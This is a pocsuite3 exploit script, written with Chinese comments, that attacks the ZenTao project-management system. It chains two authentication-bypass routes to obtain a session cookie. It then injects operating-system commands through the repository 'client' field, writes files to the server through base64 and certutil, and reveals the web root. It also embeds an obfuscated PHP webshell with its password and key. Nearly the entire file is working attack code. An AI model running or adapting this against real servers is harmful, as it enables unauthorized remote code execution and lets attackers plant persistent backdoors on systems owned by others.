#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
import inspect
import re
import urllib
from urllib.parse import urljoin
import os

from requests import Session, Request

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    author = 'admin'
    vulDate = '2023-08-05'
    createDate = '2023-08-05'
    updateDate = '2023-08-05'
    name = 'zentao bypass rce'
    appName = 'zentao'
    install_requires = ['']
    dork = {'zoomeye': ''}

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.32 (KHTML, like Gecko) Chrome/99.0.4612.71 Safari/517.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "close"}

    # 魔改shell
    # cryption ==> PHP_XOR_BASE64_PLUS
    # pass ==> Vbwpfa
    # key ==> AkLGZ4qVrB
    shell1 = """<?php
    @session_start();
    @set_time_limit(0);
    $p = 'Vbwpfa';
    $name = 'Init';
    $k = 'c2f9f9f921c77385';
    $param = $_POST[$p];
    if (!isset($_SESSION[$name]) && isset($param)) {
        $data = base64_decode($param);
        for ($i = 0; $i < strlen($data); $i++) {
            $c = $k[$i + 1 & 15];
            $data[$i] = $data[$i] ^ $c;
        }
        $data = "\$pass='" . $p . "';\$key='" . $k . "';" . $data;
        $_SESSION[$name] = $data;
    }

    $a = $_SESSION[$name];
    if (isset($a)) eval($a);
    """

    def _options(self):
        o = OrderedDict()
        o['type'] = OptString("cmd::whoami",
                              description="example: 'cmd::<whoami>'、'file::<file_local_path>::<file_remote_path>'、'getpath'")
        o['os'] = OptString("linux", description="write file: 'win' or 'linux'")
        return o

    def _verify(self):
        result = {}
        resp = requests.get(self.url)
        print(resp.text)
        try:
            findall = re.findall("zh-cn\.default\.css\\?v=(.*?)'\stype", resp.text)
            logger.info(findall)
            logger.info(findall[0])
            logger.info(findall[1])
        except Exception as e:
            logger.error(f"get zentao version error: {e}")


        bypass_type, sessionid = self.bypassAll()
        if bypass_type == 0:
            return

        if sessionid != None:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['bypass type'] = bypass_type
        return self.parse_output(result)

    def _get_content(self, file_path):
        with open(file_path, "r") as f:
            return f.read()

    def _attack(self):
        result = {}
        #bypass_type, sessionid = self.bypassAll()
        bypass_type = 1
        sessionid = "7c48aa06ab2a0a145814479bfda5dd72"

        if bypass_type == 0:
            return

        type = self.get_option("type")

        if type == "getpath":
            if bypass_type == 1:
                path = self.getPath1(sessionid)
            elif bypass_type == 2:
                path = self.getPath2(sessionid)
            if path is not None:
                result['AttackInfo'] = {}
                result['AttackInfo']['URL'] = self.url
                result['AttackInfo']['web path'] = path
            return self.parse_output(result)

        args = type.split("::")
        os = self.get_option("os")

        if args[0] == "cmd":
            cmd = args[1]
            if bypass_type == 1:
                result_ = self.execCmd1(sessionid, cmd)
            elif bypass_type == 2:
                result_ = self.execCmd2(sessionid, cmd)
            else:
                logger.error(f"error 'bypass_type' {bypass_type}")
                return
            if result_ != None and result_ != False:
                result['WriteInfo'] = {}
                result['WriteInfo']['URL'] = self.url
        elif args[0] == "file":
            file_local_path, file_remote_path = args[1:]
            content = self._get_content(file_local_path)

            if os.startswith("win"):
                if bypass_type == 1:
                    result_ = self.winSaveFile1(sessionid, content, file_remote_path)
                elif bypass_type == 2:
                    result_ = self.winSaveFile2(sessionid, content, file_remote_path)
                else:
                    logger.error(f"error 'bypass_type' {bypass_type}");
                    return
                if result_ != None and result_ != False:
                    result['WriteInfo'] = {}
                    result['WriteInfo']['URL'] = self.url

            elif os.startswith("linux"):
                if bypass_type == 1:
                    result_ = self.linuxSaveFile1(sessionid, content, file_remote_path)
                elif bypass_type == 2:
                    result_ = self.linuxSaveFile2(sessionid, content, file_remote_path)
                else:
                    logger.error(f"error 'bypass_type' {bypass_type}");
                    return
                if result_ != None and result_ != False:
                    result['WriteInfo'] = {}
                    result['WriteInfo']['URL'] = self.url
            else:
                logger.error(f"error 'os' {os}")
                return
        else:
            logger.error(f"error 'args[0]' {args[0]}")
            return

        return self.parse_output(result)

    # 一键检测两个权限绕过漏洞，并返回session
    def bypassAll(self):
        sessionid = self.bypass1()
        if sessionid != None:
            return 1, sessionid

        sessionid = self.bypass2()
        if sessionid != None:
            return 2, sessionid
        logger.error("没有权限绕过")
        return 0, None

    # 最常见的路由，检测权限绕过
    def bypass1(self):
        path1 = "/misc-captcha-user.html"
        path2 = "/block-printBlock-1-my.html"
        return self._bypass(path1, path2)

    # PATH-INFO路由，检测权限绕过
    def bypass2(self):
        path1 = "/index.php?m=misc&f=captcha&sessionVar=user"
        path2 = "/index.php?m=block&f=printBlock&id=1&module=my"
        return self._bypass(path1, path2)

    def _bypass(self, path1, path2):
        response = requests.get(self.url + path1, headers=self.headers)
        cookie = response.headers.get("Set-Cookie")
        try:
            zentaosid = re.findall("zentaosid=(.*?);", cookie)[0]
        except Exception as e:
            logger.error(e)
            return None
        logger.info("zentaosid=" + zentaosid);
        newHeader = {**self.headers, **{"Cookie": cookie}}
        response = requests.post(self.url + path2, headers=newHeader)

        func = inspect.stack()[1].function
        if ".block-welcome .col-left " in response.text:
            # 获取调用者函数名
            logger.info(f"{func} exist vulnerable")
            return zentaosid
        else:
            logger.error(f"{func} not exist")
        return None

    # 通用执行命令1，前提是需要sessionid，也就是zentaosid，通过bypass函数获取
    def execCmd1(self, zentaosid, cmd):
        path = "/repo-edit-8888.html"
        return self._execCmd(path, zentaosid, cmd)

    # 通用执行命令2
    def execCmd2(self, sessionid, cmd):
        path = "/index.php?m=repo&f=edit&repoID=942&objectID=942"
        return self._execCmd(path, sessionid, cmd)

    def _execCmd(self, path, zentaosid, cmd):
        data = f"SCM=Subversion&client={urllib.parse.quote(cmd)}%26&path=1"

        h2 = {"Referer": self.url,  # 必须有
              "Content-Type": "application/x-www-form-urlencoded",
              "X-Requested-With": "XMLHttpRequest",  # 必须有，否则不会返回json数据，只会返回html 200
              "Cookie": f"zentaosid={zentaosid}"}

        newHeader = {**self.headers, **h2}
        response = requests.post(self.url + path, headers=newHeader, data=data, allow_redirects=False, )
        logger.info(response)
        return True

    def _winSaveFile(self, zentaosid, fileContent, path, execCmdMethod):
        length = len(fileContent)
        logger.info(f"写入的文件大小为：{length} Byte")
        if (length > 1024 * 5):
            logger.info("当前写入文件大于 5kb，无法写入")
            return False

        fileB64 = base64.b64encode(fileContent.encode()).decode()
        tmpPath = path + "1"
        cmd0 = f"del " + path.replace('/', '\\')  # 因为certutil不支持解码覆盖文件，所以先删除
        cmd1 = f"echo -----BEGIN CERTIFICATE-----{fileB64}-----END CERTIFICATE----- > {tmpPath}"
        cmd2 = f"certutil -decode {tmpPath} {path}"
        cmd3 = "del " + tmpPath.replace('/', '\\')  # del命令参数不支持 C:/xxx/xx这样写法，会报错

        logger.info(f"[*] 1/4 删除目标文件: {cmd0}")
        execCmdMethod(zentaosid, cmd0)

        logger.info(f"[*] 2/4 写入文件到: {tmpPath}")
        execCmdMethod(zentaosid, cmd1)

        logger.info(f"[*] 3/4 base64解码: {cmd2}")
        execCmdMethod(zentaosid, cmd2)

        logger.info(f"[*] 4/4 删除临时文件: {cmd3}")
        execCmdMethod(zentaosid, cmd3)
        logger.info("write file done.")
        return True

    # windows写入文件1
    # 测试一次性最多支持 5kb 的字符串写入： "c" * 1024*5
    # 路径支持 C:\\xampp\\zentao\\www\\xxx.txt、C:/xampp/zentao/www/xxx.txt
    # win上默认可以解析的php文件为：C:/xampp/zentao/www/upgradexuanxuan.php
    def winSaveFile1(self, zentaosid, fileContent, path):
        return self._winSaveFile(zentaosid, fileContent, path, self.execCmd1)

    # windows写入文件2
    def winSaveFile2(self, zentaosid, fileContent, path):
        return self._winSaveFile(zentaosid, fileContent, path, self.execCmd2)

    # linux写文件
    def _linuxSaveFile(self, zentaosid, fileContent, path, execCmdMethod):
        length = len(fileContent)
        logger.info(f"写入的文件大小为：{length} Byte")
        if (length > 1024 * 5):
            logger.info("当前写入文件大于 5kb，无法写入")
            return False

        fileB64 = base64.b64encode(fileContent.encode()).decode()
        tmpPath = path + "1"
        cmd0 = f"rm -f " + path
        cmd1 = f"echo -n '{fileB64}' > {tmpPath}"
        cmd2 = f"cat {tmpPath} | base64 -d > {path}"
        cmd3 = "rm -f " + tmpPath

        logger.info(f"[*] 1/4 删除目标文件: {cmd0}")
        execCmdMethod(zentaosid, cmd0)

        logger.info(f"[*] 2/4 写入文件到: {tmpPath}")
        execCmdMethod(zentaosid, cmd1)

        logger.info(f"[*] 3/4 base64解码: {cmd2}")
        execCmdMethod(zentaosid, cmd2)

        logger.info(f"[*] 4/4 删除临时文件: {cmd3}")
        execCmdMethod(zentaosid, cmd3)
        logger.info("write file done.")
        return True

    # linux写文件姿势1
    def linuxSaveFile1(self, zentaosid, fileContent, path):
        return self._linuxSaveFile(zentaosid, fileContent, path, self.execCmd1)

    # linux写文件姿势2
    def linuxSaveFile2(self, zentaosid, fileContent, path):
        return self._linuxSaveFile(zentaosid, fileContent, path, self.execCmd2)

    def getPath1(self, zentaosid):
        path = "/repo-create-0.html"
        return self._getPath(zentaosid, path)

    def getPath2(self, zentaosid):
        path = "/index.php?m=repo&f=create&repoID=0"
        return self._getPath(zentaosid, path)

    def _getPath(self, zentaosid, path):
        data = f"SCM=Subversion&client=123%26&path=1"
        h2 = {"Referer": self.url,  # 必须有
              "Content-Type": "application/x-www-form-urlencoded",
              "X-Requested-With": "XMLHttpRequest",  # 必须有，否则不会返回json数据，只会返回html 200
              "Cookie": f"zentaosid={zentaosid}"}

        newHeader = {**self.headers, **h2}
        response = requests.post(self.url + path, headers=newHeader, data=data, allow_redirects=False)
        logger.info(response)
        try:
            path = re.findall("u4ef6(.*?)tmp", response.text)[0].replace("\\/", "/")
            web_path = f"{path}www/"

            logger.info(f"zentao path: {path}")
            logger.info(f"zentao web path: {web_path}")
            return web_path
        except Exception as e:
            logger.error(e)
        return None


register_poc(DemoPOC)
